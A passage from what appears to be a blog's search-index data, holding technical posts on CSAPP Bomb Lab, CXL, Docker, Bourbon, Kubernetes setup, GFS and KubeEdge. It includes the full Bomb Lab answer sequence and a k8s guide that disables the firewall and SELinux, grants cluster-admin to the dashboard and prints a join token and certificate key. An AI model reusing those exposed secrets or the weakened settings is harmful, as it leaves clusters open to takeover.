最终结果123456789101112131415hey-kong@LAPTOP-9010T96A:/mnt/c/ubuntu/csapp/bomb65$ ./bombWelcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!I am just a renegade hockey mom.Phase 1 defused. How about the next one?0 1 1 2 3 5That's number 2. Keep going!1 171Halfway there!13 3So you got that one. Try this one.5 115Good work! On to the next...3 1 2 6 5 4Congratulations! You've defused the bomb! repoMy solutions to CSAPP labs","link":"/2021/01/21/Bomb-Lab/"},{"title":"CXL Introduction","text":"What is CXLCXL (Compute Express Link) is a new type of open interconnect standard designed for high-speed communication between processors and high-performance endpoint devices such as GPUs, FPGAs, or other accelerators. When discussing CXL, it is indispensable to mention the hierarchical storage diagram in computer architecture. In the past, there was a significant gap between HDD disks and memory, but the emergence of SSDs and NVMe devices gradually bridged this gap. Traditional databases have become less sensitive to this difference because the bottleneck of the system has shifted to the CPU side. Therefore, in recent years, everyone has been focusing on column storage, vectorization, and other technologies to reduce memory usage. For many applications, although the latency of NVMe has met the requirements, throughput remains a significant bottleneck, and it cannot completely replace memory. Model training and vector data are very typical scenarios in this regard. CXL effectively addresses this problem. By mounting the device on the PCIe bus, CXL establishes an interconnection between the device and the CPU, realizing the separation of storage and computation. CXL ProtocolsCXL comprises three different protocols - CXL.io, CXL.cache, and CXL.mem, each serving a different purpose. CXL.io is built on the physical and link layers of the PCI Express (PCIe) infrastructure. It ensures backward compatibility with the PCIe ecosystem, thus leveraging the advantages of its wide deployment. When a CXL device is connected to a host, these operations are carried out through the CXL.io protocol. It handles input/output operations, and allows discovery, configuration, and basic management of devices. CXL.cache provides cache coherency between the host processor cache hierarchy and the memory on CXL devices. This coherency allows the host and device to share resources, thereby reducing latency and improving data access rates. This is crucial for high-performance computing workloads such as big data processing and machine learning, which often require frequent access to large amounts of data. CXL.mem allows the host processor to access a CXL device’s memory at high speed and with low latency. This mechanism allows the host to effectively utilize the device’s memory as a pool of resources, making it highly suitable for applications that require intensive data exchange. Specifically, CXL mainly defines three types of devices: CXL Type 1 Device: This type of device includes accelerators and smart network cards. They access host memory via the CXL.cache protocol, maintaining a local cache that’s coherent with the host memory. CXL Type 2 Device: This category includes devices such as GPUs and FPGAs, which have their own memory such as DDR and HBM. These devices can access the host memory directly like Type 1 devices. Additionally, they can use the CXL.mem protocol to allow the host to access their local address space. CXL Type 3 Device: These are memory expansion devices that allow the host to access their memory buffer consistently via CXL.mem transactions. Type 3 CXL devices can be used to increase memory capacity and bandwidth. Maximizing CXL EfficiencyTo fully utilize CXL memory, several crucial factors must be taken into account: Consider the memory hierarchy fully and use RAM or even Cache as the buffer for CXL. Push down computations as much as possible to reduce the amount of data that the bus needs to handle. Take the latency of CXL fully into account and design pipelines or use prefetching techniques to reduce the impact of latency on throughput. Fully exploit the advantages of large memory to minimize the performance impact brought by data exchange in distributed systems. References https://zhuanlan.zhihu.com/p/646858357 https://jia.je/hardware/2022/11/20/cxl-notes/","link":"/2023/08/03/CXL-Introduction/"},{"title":"Docker 简述","text":"什么是容器当一个应用程序仅由较少数量的大组件构成时，完全可以接受给每个组件分配专用的虚拟机，以及通过给每个组件提供自己的操作系统实例来隔离它们的环境。但是当这些组件开始变小且数量开始增长时，如果你不想浪费硬件资源，又想持续压低硬件成本，那就不能给每个组件配置一个虚拟机了。 容器类似与虚拟机，但开销小很多。一个容器里运行的进程实际上运行在宿主机的操作系统上，就像所有其他进程一样，不像虚拟机，进程是运行在不同的操作系统上的。但在容器里的进程仍然是和其他进程隔离的。对于容器内进程本身而言，就好像是在机器和操作系统上运行的唯一一个进程。 容器隔离机制容器实现隔离有两个机制：第一个是 Linux 命名空间，它使每个进程只看到它自己的系统视图；第二个是 cgroups，它限制了进程能使用的资源量。 用 Linux 命名空间隔离进程每个 Linux 系统最初只有一个命名空间，所有的系统资源都属于这一个命名空间。一个进程在一个命名空间下运行，进程将只能看到同一个命名空间下的资源。通过 clone 函数可以在创建新进程的同时创建 namespace： 1int pid = clone(main_function, stack_size, CLONE_NEWPID | SIGCHLD, NULL); 在这里指定 CLONE_NEWPID 参数，这样新创建的进程，就会看到一个全新的进程空间。而此时这个新的进程，也就变成了 PID=1 的进程。 与 namespace 相关的 flag 参数有 CLONE_NEWNS、CLONE_NEWUTS、CLONE_NEWIPC、CLONE_NEWPID、CLONE_NEWNET 和 CLONE_NEWUSER，对应 Mount(mnt)、UTS、Inter-process communication(ipc)、Process ID(pid)、Network(net)、User ID(user) 这六种类型的命名空间。 用 cgroups 限制系统的可用资源cgroups 是一个 Linux 内核功能，它用来限制一个进程或者一组进程的资源使用。一个进程的资源（CPU、内存、网络带宽等）使用量不能超过被分配的量。 cgroups 通过 cgroupfs 提供接口，cgroupfs 默认情况下挂载在 /sys/fs/cgroup 目录。 cgroups 限制 CPU、内存的简单操作方法： 123456789# 创建一个新的目录，也就是创建了一个新的 cgroup mkdir /sys/fs/cgroup/cpuset/demo# 配置这个 cgroup 的资源配额，限制这个 cgroup 的进程只能在 0 号 CPU 上运行，并且只能在 0 号内存节点分配内存echo 0 &gt; /sys/fs/cgroup/cpuset/demo/cpuset.cpusecho 0 &gt; /sys/fs/cgroup/cpuset/demo/cpuset.mems# 将进程 id 写进 tasks 文件，即整个进程移动到 cgroup 中，cgroup 开始起作用echo &gt; /sys/fs/cgroup/cpuset/demo/tasks Docker 容器介绍Docker 是第一个使容器在不同机器之间移植的系统。Docker 有三个概念： 镜像 —— Docker 镜像里包含了打包的应用程序及其所依赖的环境。 镜像仓库 —— Docker 镜像仓库用于存放 Docker 镜像。 容器 —— 一个运行中的容器是一个运行在 Docker 主机上的进程，但它和主机以及所有运行在主机上的其他进程都是隔离的。 Docker 推荐将容器运行时的 cgroup driver 更改为 systemd，systemd 限制 CPU、内存的简单操作方法： 12# 限制 CPU 占用为 0.1 个 CPU，内存为 200 MBsystemctl set-property xxxx.service CPUShares=100 MemoryLimit=200M systemd 相对 cgroupfs 更加简单，目前主流 Linux 发行版中 systemd 是系统自带的 cgroup 管理器，系统初始化就存在的，和 cgroups 联系紧密。 如果 Docker 的 cgroup driver 是 cgroupfs，就会存在两个控制管理器，对于该服务器上启动的容器使用的是 cgroupfs，而对于其他 systemd 管理的进程使用的是 systemd，这样在服务器资源负载高的情况下可能会变的不稳定。","link":"/2022/01/20/Docker-%E7%AE%80%E8%BF%B0/"},{"title":"From WiscKey to Bourbon: A Learned Index for Log-Structured Merge Trees","text":"背景Bourbon 基于 WiscKey（比 LevelDB 和 RocksDB 更快的 LSM-Tree 存储系统）实现。本文通过对 WiscKey 的实验分析，总结了五条指南。Bourbon 应用了这些指南，将 WiscKey 与学习索引相结合，利用学习索引实现快速查找。 设计与实现Five learning guidelines Favor learning files at lower levels (生命周期更长) Wait before learning a file (连续的 compaction 会在每一层生成生命周期非常短的新文件) Do not neglect files at higher levels (可以提供多种内部查询方式) Be workload- and data-aware (在不同的场景中查找会有很大差异) Do not learn levels for write-heavy workloads (变化很快) Beneficial regimes 学习索引只能缩短检索时间。 Bourbon Learning Bourbon 使用分段线性回归（PLR）对数据进行建模，PLR 在学习和查找过程中开销较低，而且空间开销也很小。Bourbon 可以学习单个 SSTables文件（File Learning）或整个层级（Level Learning）。层级学习对于只读工作负载收益更高，而对于混合工作负载，层级学习的性能不如文件学习。 为了训练 PLR 模型，Bourbon 使用了 Greedy-PLR 算法，一次处理一个数据点，如果数据点不能在不超出定义的误差限制的情况下被添加到当前的线段中，那么将创建一个新的线段，并将数据点添加到其中，最终 Greedy-PLR 生成了一组代表数据的线段。Greedy-PLR 的运行时间与数据点的数量呈线性关系。 Cost-benefit analyzer (CBA)成本效益分析（Cost-Benefit Analyzer, CBA）的目的是过滤掉不值得学习的生命周期较短的文件。CBA 在同一层级使用之前文件的统计信息。 为了过滤短生命周期文件，Bourbon 在学习文件之前会等待一个时间阈值 $T_{wait}$。对一个文件进行学习的最大耗时约为 40 毫秒，因此 Bourbon 将 $T_{wait}$ 设置为 50 毫秒。但是，学习一个长期存在的文件也可能没有好处。作者实验发现更低层级的文件通常寿命更长，对于有的工作负载和数据集，他们服务的查询操作比更高层级的文件要少得多。因此，除了考虑模型对应的开销以外，还需要考虑模型可能带来的收益。如果一个模型的收益（$B_{model}$）大于构建该模型的开销（$C_{model}$），那么该模型就是有利的。 Estimating the cost ($C_{model}$)如果假定学习过程发生在后台（有很多空闲的 core），那么 $C_{model}$ 开销就为 0。不过 Bourbon 采取了保守的做法，假设学习线程会对系统产生干扰，导致性能变慢。因此，论文将 $C_{model}$ 开销定义为与 $T_{build}$ 相等，即文件训练 PLR 模型的时间。由于 $T_{build}$ 与文件中数据点的数量成线性比例，我们将 $T_{build}$ 定义为文件中数据点的数量与训练一个数据点的平均时间的乘积。 Estimating the benefit ($B_{model}$)Bourbon 定义模型带来的收益如下: $$B_{model} = (T_b - T_m) * N$$ $T_{b}$: 在基线中查找的平均时间 $T_{m}$: 在模型路径中查找的平均时间 $N$: 文件在其生命周期内的查找次数 然后又将查询操作又划分成了 negative 和 positive，因为大多数 negative 的查询操作在 filter 处就终止了，所以最终的收益模型为: $$B_{model} = ((T_{n.b} - T_{n.m}) * N_n) + ((T_{p.b} - T_{p.m}) * N_p)$$ $N_{n}$ &amp; $N_{p}$: negative 和 positive 的查询数量 $T_{n.b}$ &amp; $T_{p.b}$: 在基线中 negative 和 positive 查找的平均时间 $T_{n.m}$ &amp; $T_{p.m}$: 在模型路径中 negative 和 positive 查找的平均时间 为了估计查找次数（$N_{n}$ &amp; $N_{p}$）和查找所需时间（$T_{n.b}$ &amp; $T_{p.b}$），CBA 维护了这些文件在其生命周期内和在同一层级上的文件的统计信息（因为统计信息在不同层级之间存在显著差异）。 这些估算在 $T_{wait}$ 期间完成: $T_{n.b}$ &amp; $T_{p.b}$: 在 $T_{wait}$ 期间，查询将通过基线路径，这些查询时间用于估计 $T_{n.b}$ 和 $T_{p.b}$ $T_{n.m}$ &amp; $T_{p.m}$: 通过同一层级所有其他文件的平均值进行估计 $N_{n}$ &amp; $N_{p}$: CBA 首先获取该层级中其他文件的平均 negative 查找和 positive 查找，然后，将其按 $f = s / s’$ 的倍数进行缩放，其中 $s$ 是文件的大小，$s’$ 是该层级的文件的平均大小 如果 $C_{model} &lt; B_{model}$，文件将会开始训练。如果多个文件同时开始训练，则将它们放在一个最大优先级队列中，从而使收益最大的文件能够先被训练。 未来可能的改进方向包括： 对 $N_{n}$, $N_{p}$, $T_{n.m}$, $T_{p.m}$ 进行更精确的估计 改进计算 $C_{model}$ 开销的方法，使其不仅仅是 $T_{build}$ 使用另外的函数对训练队列进行排序，而非 $B_{model} - C_{model}$ Bourbon: Putting it All Together 评估 参考 From WiscKey to Bourbon: A Learned Index for Log-Structured Merge Trees Presentation video at OSDI ‘20 Presentation slides at OSDI ‘20","link":"/2021/09/20/From-WiscKey-to-Bourbon-A-Learned-Index-for-Log-Structured-Merge-Trees/"},{"title":"CentOS7.6部署k8s","text":"两台 2 核 CPU、2G 内存的阿里云服务器，一台 master 节点，一台 node 节点。 准备工作关闭防火墙12systemctl stop firewalldsystemctl disable firewalld 禁用 swap 分区1swapoff -a &amp;&amp; sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab 禁用 SELinux1setenforce 0 &amp;&amp; sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config 时间同步12systemctl start chronydsystemctl enable chronyd 重新设置主机名12345678910# master 节点hostnamectl set-hostname master# node 节点hostnamectl set-hostname nodevi /etc/hosts# 添加 ip：8.130.22.97 master8.130.23.131 node 将桥接的 IPv4 以及 IPv6 的流量串通123456cat &gt;/etc/sysctl.d/k8s.conf &lt;&lt; EOFnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOFsysctl --system 配置 ipvs123456789101112131415sudo yum install -y yum-utilsyum install ipset ipvsadmin -ycat &lt;&lt;EOF&gt; /etc/sysconfig/modules/ipvs.modules#!/bin/bashmodprobe -- ip_vsmodprobe -- ip_vs_rrmodprobe -- ip_vs_wrrmodprobe -- ip_vs_shmodprobe -- nf_conntrack_ipv4EOFchmod +x /etc/sysconfig/modules/ipvs.modules/bin/bash /etc/sysconfig/modules/ipvs.moduleslsmod | grep -e ip_vs -e nf_conntrack_ipv4 安装 docker12345678910111213141516yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum install docker-ce-19.03.2 docker-ce-cli-19.03.2 containerd.io-1.4.4 -y# 使用 systemd 代替 cgroupfs，配置仓库镜像地址mkdir /etc/dockervi /etc/docker/daemon.json# 添加：{&quot;registry-mirrors&quot;: [&quot;https://q2hy3fzi.mirror.aliyuncs.com&quot;],&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]}# 启动 dockersystemctl start dockersystemctl enable docker --now 安装 k8s123456789101112131415161718192021222324252627282930313233343536373839404142434445cat &lt;&lt;EOF | sudo tee /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpghttp://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgexclude=kubelet kubeadm kubectlEOFyum install -y kubelet-1.23.1 kubeadm-1.23.1 kubectl-1.23.1 --disableexcludes=kubernetesvi /etc/sysconfig/kubelet# 添加：KUBELET_CGROUP_ARGS=&quot;--cgroup-driver=systemd&quot;KUBE_PROXY_MODE=&quot;ipvs&quot;systemctl enable --now kubelet# 组件下载脚本sudo tee ./images.sh &lt;&lt;-'EOF'#!/bin/bashimages=(kube-apiserver:v1.23.1kube-proxy:v1.23.1kube-controller-manager:v1.23.1kube-scheduler:v1.23.1coredns:1.7.5etcd:3.4.13-0pause:3.2kubernetes-dashboard-amd64:v1.10.0heapster-amd64:v1.5.4heapster-grafana-amd64:v5.0.4heapster-influxdb-amd64:v1.5.2pause-amd64:3.1)for imageName in ${images[@]} ; dodocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageNamedocker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageNamedoneEOF# 执行脚本chmod +x ./images.sh &amp;&amp; ./images.sh 部署 k8s master123456789101112131415161718192021kubeadm init \\--kubernetes-version v1.23.1 \\--control-plane-endpoint &quot;master:6443&quot; \\--upload-certs \\--image-repository registry.aliyuncs.com/google_containers \\--pod-network-cidr=10.244.0.0/16# 将执行成功后的命令拷贝过来mkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config# kubectlkubectl get node# 安装插件curl https://docs.projectcalico.org/manifests/calico.yaml -Okubectl apply -f calico.yaml# 查看 node，状态为 readykubectl get node 如果安装失败，需要 reset： 12kubeadm resetrm -rf $HOME/.kube 部署 k8s node需要执行在 kubeadm init 输出的 kubeadm join 命令： 123kubeadm join master:6443 --token hkakru.rnv32cvzw2alodkw \\--discovery-token-ca-cert-hash sha256:49257352b5a320c40785df0b6cc5534e7ae0b6cc758023b52abc0da4b5e9890d \\--control-plane --certificate-key bd218950889df9e03586f4df549a1ec955715d75fb9e576ec75f3287c0004063 部署 dashboard1234567kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.3.1/aio/deploy/recommended.yamlkubectl edit svc kubernetes-dashboard -n kubernetes-dashboard# type: ClusterIP 改为 type: NodePort# 查看 dashboard 端口kubectl get svc -A | grep kubernetes-dashboard 通过 https://集群任意IP:端口 来访问，这里可以是 https://8.130.22.97:31323。 添加用户和绑定角色123456789101112131415161718192021vi dash.yaml# 添加：apiVersion: v1kind: ServiceAccountmetadata: name: admin-user namespace: kubernetes-dashboard---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: admin-userroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects:- kind: ServiceAccount name: admin-user namespace: kubernetes-dashboard 生成登录 token1kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk '{print $1}') 将输出的 token 输入到网站中，就可以看到管理界面了。","link":"/2022/01/26/CentOS7-6%E9%83%A8%E7%BD%B2k8s/"},{"title":"Google File System","text":"背景GFS 是 Google 针对大数据处理场景设计的分布式文件系统，Google 对数据量的持续增长的设想如下： 需要能够运行在经常故障的物理机环境上。只有做到这点，这个系统才能运行在几百到上千台规模下，并采用相对便宜的服务器硬件 大文件居多。存储在 GFS 上的文件的不少都在几个 GB 这样的级别 大多数写是append写，即在文件末尾追加 性能主要考量是吞吐而不是延时 接口GFS 以目录树的形式组织文件，但是并没有提供类似 POSIX 标准的文件系统操作。操作只要包含 create, open, write, read, close, delete, append, snapshot，其中 snapshot 用于快速复制一个文件或者目录，允许多个客户端并行追加数据到一个文件。 架构整体架构上，GFS 由单一的 master 节点、chunkserver 和提供给用户的 client 三大部分组成： client 与 chunkserver 都不会缓存文件数据，为的是防止数据出现不一致的状况，但是 client 会缓存 metadata 的信息。 master一方面存储所有的 metadata，负责管理所有的元信息，包括表示文件系统目录结构的 namespace、访问控制信息、文件与 chunk 的映射关系、chunk 的位置信息；另一方面管理 chunk 租约、chunk 迁移(如果 chunkserver 挂掉)、维护与 chunkserver 之间的心跳。 namespace 采用全内存的数据结构，以提高访问的吞吐 namespace 是一个查找表(lookup table)，并且采用了前缀压缩的方式存储在内存中，它是一个树结构，树中每一个节点(文件名或目录名)都有一个读/写锁。在对文件或目录操作的时候需要获取锁，例如修改 /root/foo/bar，需要获得 /root、/root/foo 的读锁，/root/foo/bar 的写锁 master 本身并不记录 chunk 的位置，而是在启动的时候，通过收取 chunkserver 的信息来构建。这种设计避免了 master 和 chunkserver 的信息不一致的问题(因为以 chunkserver 为准) master 和 chunkserver 通过定期心跳来保持信息同步、感知 chunkserver 故障等 master 往磁盘上写操作日志，并将这些日志同步到其他物理机保存的方式来确保数据安全性。当前 master 机器故障的时候，可以通过这些日志和 chunkserver 的心跳内容，可以恢复到故障前的状态 对于操作日志，会定期在系统后台执行 checkpoint；checkpoint 构建成一个类似B+树、可以快速的 load 到内存中直接使用的结构 master 需要定期检查每个 chunk 的副本情况，如果副本低于配置值，就需要将通知 chunkserver 进行复制；如果存在一些多余的 chunk (file 已经被删除了)，就需要做一些清理工作 chunkserver每个 chunk 有一个 64 位标识符(chunk handle)，它是在 chunk 被创建时由 master 分配的，每一个 chunk 会有多个副本，分别在不同的机器上，每个副本会以 Linux 文件的形式存储在 chunkserver 的本地磁盘上。GFS 中将 chunk 的大小定为 64 MB，它比一般的文件系统的块大小要大。优点：减少 metadata 的数量、减少 client 与 master 的交互、client 可以在一个 chunk 上执行更多的操作，通过 TCP 长连接减少网络压力；缺点：如果在一个 chunk 上有一个可执行文件，同时有许多 client 都要请求执行这个文件，它的压力会很大。chunk 的位置信息在 master 中不是一成不变的，master 会通过定期的 heartbeat 进行更新，这样做能够减小开销，这样做就不用 master 与 chunkserver 时刻保持同步通信(包括 chunkserver 的加入、退出、改名、宕机、重启等)。chunkserver 上有一个 final word，它表示了哪个 chunk 在它的磁盘上，哪个 chunk 不在。 一致性模型 defined：状态已定义，从客户端角度来看，客户端完全了解已写入集群的数据consistent：客户端来看chunk多副本的数据完全一致，但不一定defined 串行写：客户端自己知道写入文件范围以及写入数据内容，且本次写入在数据服务器的多副本上均执行成功，每个客户端的写操作串行执行，因此最终结果是 defined 并行写：每次写入在数据服务器的多副本上均执行成功，所以结果是 consistent，但客户端无法得知写操作的执行顺序，即使每次操作都成功，客户端无法确定在并发写入时交叉部分，所以是 undefined 追加写：客户端能够根据 offset 确切知道写入结果，无论是串行追加还是并发追加，其行为是 defined，追加时至少保证一次副本写成功，如果存在追加失败，则多个副本之间某个范围的数据可能不一致，因此是 interspersed with inconsistent。 GFS 租约GFS 使用租约机制 (lease) 来保障 mutation (指的是改变了 chunk 的内容或者 metadata，每一次 mutation 都应该作用于所有的备份) 的一致性：多个备份中的一个持有 lease，这个备份被称为 primary replica (其余的备份为 secondary replicas)，GFS 会把所有的 mutation 都序列化(串行化)，让 primary 执行，secondary 也按相同顺序执行，primary 是由 master 选出来的，一个 lease 通常 60 秒会超时。 写流程 client 向 master 请求持有 lease 的 chunk (primary replica) 位置和其他 replicas 的位置(如果没有 chunk 持有 lease，那么 master 会授予其中一个 replica 一个 lease) master 返回 primary 的信息和其他 replicas 的位置，然后 client 将这些信息缓存起来(只有当 primary 无法通信或者该 primary replica 没有 lease 了，client 才会向 master 再次请求) client 会将数据发送到所有的 replicas，每个 chunkserver 会把数据存在 LRU 缓存中 在所有的 replicas 都收到了数据之后，client 会向 primary 发送写请求。primary 会给它所收到的所有 mutation 分配序列号(这些 mutation 有可能不是来自于同一个 client)，它会在自己的机器上按序列号进行操作 primary 给 secondaries 发送写请求，secondaries 会按相同的序列执行操作 secondaries 告知 primary 操作执行完毕 primary 向 client 应答，期间的错误也会发送给 client，client 错误处理程序 (error handler) 会重试失败的 mutation 读流程 client 向 master 发出 A 文件的读请求 master 收到后返回 A 文件的 chunk handler 和 chunk 的位置 client 携带 chunk handle 以及位偏移向对应的 chunkserver 发出请求 chunkserver 读取并返回数据至 client 参考 Ghemawat, Sanjay, Howard Gobioff, and Shun-Tak Leung. “The Google file system.” (2003).","link":"/2021/01/30/Google-File-System/"},{"title":"KubeEdge 云上部分 CloudHub 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述CloudHub 是一个 Web Socket 服务端，负责监听云端的变化，缓存并发送消息到 EdgeHub。 模块入口cloud/pkg/cloudhub/cloudhub.go： 12345678910111213141516171819202122232425262728293031323334func (a *cloudHub) Start() { if !cache.WaitForCacheSync(beehiveContext.Done(), a.informersSyncedFuncs...) { klog.Errorf(&quot;unable to sync caches for objectSyncController&quot;) os.Exit(1) } // start dispatch message from the cloud to edge node go a.messageq.DispatchMessage() // check whether the certificates exist in the local directory, // and then check whether certificates exist in the secret, generate if they don't exist if err := httpserver.PrepareAllCerts(); err != nil { klog.Exit(err) } // TODO: Will improve in the future DoneTLSTunnelCerts &lt;- true close(DoneTLSTunnelCerts) // generate Token if err := httpserver.GenerateToken(); err != nil { klog.Exit(err) } // HttpServer mainly used to issue certificates for the edge go httpserver.StartHTTPServer() servers.StartCloudHub(a.messageq) if hubconfig.Config.UnixSocket.Enable { // The uds server is only used to communicate with csi driver from kubeedge on cloud. // It is not used to communicate between cloud and edge. go udsserver.StartServer(hubconfig.Config.UnixSocket.Address) }} cloudhub 启动主要有以下 3 步： 调用 DispatchMessage，开始从云端向边缘节点派送消息 启动 HttpServer，主要用于为边端发放证书 调用 StartCloudHub 接下来对 DispatchMessage 和 StartCloudHub 进行具体分析。 DispatchMessageDispatchMessage 从云中获取消息，提取节点 ID，获取与节点相关的消息，将其放入消息队列中： 1234567891011121314151617181920212223242526func (q *ChannelMessageQueue) DispatchMessage() { for { select { case &lt;-beehiveContext.Done(): klog.Warning(&quot;Cloudhub channel eventqueue dispatch message loop stopped&quot;) return default: } msg, err := beehiveContext.Receive(model.SrcCloudHub) klog.V(4).Infof(&quot;[cloudhub] dispatchMessage to edge: %+v&quot;, msg) if err != nil { klog.Info(&quot;receive not Message format message&quot;) continue } nodeID, err := GetNodeID(&amp;msg) if nodeID == &quot;&quot; || err != nil { klog.Warning(&quot;node id is not found in the message&quot;) continue } if isListResource(&amp;msg) { q.addListMessageToQueue(nodeID, &amp;msg) } else { q.addMessageToQueue(nodeID, &amp;msg) } }} StartCloudHubStartCloudHub 的代码如下： 1234567891011func StartCloudHub(messageq *channelq.ChannelMessageQueue) { handler.InitHandler(messageq) // start websocket server if hubconfig.Config.WebSocket.Enable { go startWebsocketServer() } // start quic server if hubconfig.Config.Quic.Enable { go startQuicServer() }} 如果设置了 WebSocket 启动，就启动 WebSocket 服务器协程；如果设置了 Quic 启动，就启动 Quic 服务器协程。 WebSocket 是性能最好的，默认使用 WebSocket。Quic 作为备选项，在网络频繁断开等很不稳定场景下有优势。KubeEdge 云边消息传递是通过 cloudhub 跟 edgehub 间的 Websocket 或 Quic 协议的长连接传输的。","link":"/2022/02/24/KubeEdge-%E4%BA%91%E4%B8%8A%E9%83%A8%E5%88%86-CloudHub-%E7%AE%80%E6%9E%90/"},{"title":"KubeEdge 云上部分 DeviceController 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述DeviceController 是一个扩展的 k8s 控制器，管理边缘设备，确保设备信息、设备状态的云边同步。 模块入口cloud/pkg/devicecontroller/devicecontroller.go： 123456789101112// Start controllerfunc (dc *DeviceController) Start() { if err := dc.downstream.Start(); err != nil { klog.Exitf(&quot;start downstream failed with error: %s&quot;, err) } // wait for downstream controller to start and load deviceModels and devices // TODO think about sync time.Sleep(1 * time.Second) if err := dc.upstream.Start(); err != nil { klog.Exitf(&quot;start upstream failed with error: %s&quot;, err) }} Start 分别启动 downstream 和 upstream，同时 upstream 依赖于 downstream。注册 DeviceController 时，downstream 和 upstream 就通过 NewDownstreamController 和 NewUpstreamController 初始化好了。 downstreamdownstream 一般描述云端向边缘端下发数据。 NewDownstreamController 创建了 kubeClient，deviceManager，deviceModelManager，messageLayer，configMapManager 赋值给了 dc 并返回： 1234567891011121314151617181920212223// NewDownstreamController create a DownstreamController from configfunc NewDownstreamController(crdInformerFactory crdinformers.SharedInformerFactory) (*DownstreamController, error) { deviceManager, err := manager.NewDeviceManager(crdInformerFactory.Devices().V1alpha2().Devices().Informer()) if err != nil { klog.Warningf(&quot;Create device manager failed with error: %s&quot;, err) return nil, err } deviceModelManager, err := manager.NewDeviceModelManager(crdInformerFactory.Devices().V1alpha2().DeviceModels().Informer()) if err != nil { klog.Warningf(&quot;Create device manager failed with error: %s&quot;, err) return nil, err } dc := &amp;DownstreamController{ kubeClient: client.GetKubeClient(), deviceManager: deviceManager, deviceModelManager: deviceModelManager, messageLayer: messagelayer.NewContextMessageLayer(), configMapManager: manager.NewConfigMapManager(), } return dc, nil} downstream 的 Start 方法执行了 dc.syncDeviceModel()，dc.syncDevice() 两个函数： 12345678910111213// Start DownstreamControllerfunc (dc *DownstreamController) Start() error { klog.Info(&quot;Start downstream devicecontroller&quot;) go dc.syncDeviceModel() // Wait for adding all device model // TODO need to think about sync time.Sleep(1 * time.Second) go dc.syncDevice() return nil} syncDeviceModel 调用了 dc.deviceModelManager.Events()，获取 deviceModelManager 的 events，events 类型为 chan watch.Event，可以理解为 deviceModel 相关的事件到来后会传到通道 events 中。即 syncDeviceModel 从 deviceModelManager 中获取 event 并进行分析。 之后 syncDeviceModel 根据 e.Type 的类型执行不同的操作： 12345678910switch e.Type {case watch.Added: dc.deviceModelAdded(deviceModel)case watch.Deleted: dc.deviceModelDeleted(deviceModel)case watch.Modified: dc.deviceModelUpdated(deviceModel)default: klog.Warningf(&quot;deviceModel event type: %s unsupported&quot;, e.Type)} dc.deviceModelAdded(deviceModel) 将 deviceModel 存如表 dc.deviceModelManager.DeviceModel 中； dc.deviceModelDeleted(deviceModel) 将 deviceModel 从表 dc.deviceModelManager.DeviceModel 删除； dc.deviceModelUpdated(deviceModel) 更新表 dc.deviceModelManager.DeviceModel 中的 deviceModel，如果 deviceModel Name 不存在，则直接添加 deviceModel。 syncDevice 与 syncDeviceModel 类似，都是先通过 Events() 获取 events，然后根据 events 的类型执行相应的处理。deviceManager 与 deviceModelManager 也几乎一样。不过收到事件后的处理比 syncDeviceModel 略微复杂，需要发送消息。以 deviceAdded 为例，deviceAdded 首先把 device 存到 dc.deviceManager.Device 中，然后执行 dc.addToConfigMap(device) 和 createDevice(device)，接着执行 messagelayer.BuildResource，msg.BuildRouter 等函数来构建 msg，最后通过 dc.messageLayer.Send(*msg) 将 device 数据发送出去。 Device ModelDevice Model 描述了设备属性，如“温度”或”压力”。Device Model 相当于是模板，使用它可以创建和管理许多设备。spec 中的 properties 字段定义设备通用支持的属性，例如数据类型、是否只读、默认值、最大值和最小值；另外还有 propertyVisitors 字段，它定义每种属性字段的访问方式，例如数据是否需要经过某种运算处理，数据格式转换。以下是一个 Device Model 的例子： 1234567891011121314151617181920apiVersion: devices.kubeedge.io/v1alpha2kind: DeviceModelmetadata: name: sensor-tag-model namespace: defaultspec: properties: - name: temperature description: temperature in degree celsius type: int: accessMode: ReadWrite maximum: 100 unit: degree celsius - name: temperature-enable description: enable data collection of temperature sensor type: string: accessMode: ReadWrite defaultValue: 'OFF' DeviceDevice 代表一个实际的设备对象，可以看作是 Device Model 的实例化。spec 字段是静态的，status 字段中是动态变化的数据，如设备期望的状态和设备报告的状态。以下是一个 Device 的例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758apiVersion: devices.kubeedge.io/v1alpha2kind: Devicemetadata: name: sensor-tag-instance-01 labels: description: TISimplelinkSensorTag manufacturer: TexasInstruments model: CC2650spec: deviceModelRef: name: sensor-tag-model protocol: modbus: slaveID: 1 common: com: serialPort: '1' baudRate: 115200 dataBits: 8 parity: even stopBits: 1 nodeSelector: nodeSelectorTerms: - matchExpressions: - key: '' operator: In values: - node1 propertyVisitors: - propertyName: temperature modbus: register: CoilRegister offset: 2 limit: 1 scale: 1 isSwap: true isRegisterSwap: true - propertyName: temperature-enable modbus: register: DiscreteInputRegister offset: 3 limit: 1 scale: 1.0 isSwap: true isRegisterSwap: truestatus: twins: - propertyName: temperature reported: metadata: timestamp: '1550049403598' type: int value: '10' desired: metadata: timestamp: '1550049403598' type: int value: '15' upstreamupstream 一般描述边缘端向云端上传数据。 NewUpstreamController 通过 keclient.GetCRDClient() 创建了 crdClient，另外创建了 